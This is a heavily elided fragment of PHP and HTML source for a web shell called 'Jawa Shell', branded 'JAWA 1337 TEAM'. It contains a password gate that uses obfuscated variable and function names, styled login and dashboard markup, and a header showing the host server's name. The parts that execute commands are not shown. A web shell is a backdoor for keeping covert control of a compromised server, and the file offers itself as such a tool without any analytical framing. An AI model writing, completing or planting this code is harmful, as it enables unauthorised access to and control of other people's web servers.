...
$_0x4f2a = [""];
function _0x3c7d($p,$h){return crypt($p,$h)===$h;}

if (isset($_POST['login_password'])) {
    if (_0x3c7d($_POST['login_password'], $_0x4f2a[0])) {
...
<head>
    ...
    <title>Jawa Shell - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0e0f17 0%, #1a1b26 100%);
            min-height: 100vh;
            display: flex;
        ...
        .login-container h1 {
            ...
            margin-bottom: 10px;
            font-size: 28px;
            text-shadow: 0 0 10px rgba(9, 227, 165, 0.5);
        }
        .login-container p {
            color: #888;
            margin-bottom: 30px;
        ...
        .login-container input[type="password"]:focus {
            outline: none;
            border-color: #09e3a5;
            box-shadow: 0 0 15px rgba(9, 227, 165, 0.3);
        }
        .login-container input[type="submit"] {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #09e3a5 0%, #0985e3 100%);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
        ...
        .login-container input[type="submit"]:hover {
            ...
            box-shadow: 0 5px 20px rgba(9, 227, 165, 0.4);
        }
        .team-badge {
            margin-top: 25px;
            padding: 10px 20px;
            background: rgba(9, 227, 165, 0.1);
            border-radius: 20px;
            color: #09e3a5;
            font-size: 12px;
            border: 1px solid rgba(9, 227, 165, 0.3);
        }
    </style>
</head>
<body>
    <div class="login-container">
        ...
        <div class="team-badge">JAWA 1337 TEAM</div>
    </div>
</body>
</html>
<?php
...
<head>
    ...
    <title>Jawa [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    ...
    <style>
        ...
        .logout-btn {
            ...
            top: 10px;
            right: 10px;
            background: linear-gradient(135deg, #e34909 0%, #e30985 100%);
            color: #fff;
            padding: 8px 20px;
            border-radius: 5px;
            text-decoration: none;
...
<body>
    <a href="?logout=1" class="logout-btn"><i class="fa-solid fa-right-from-bracket"></i> Logout</a>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-brands fa-github"></i>&nbsp;Jawa 1337 Team</li>
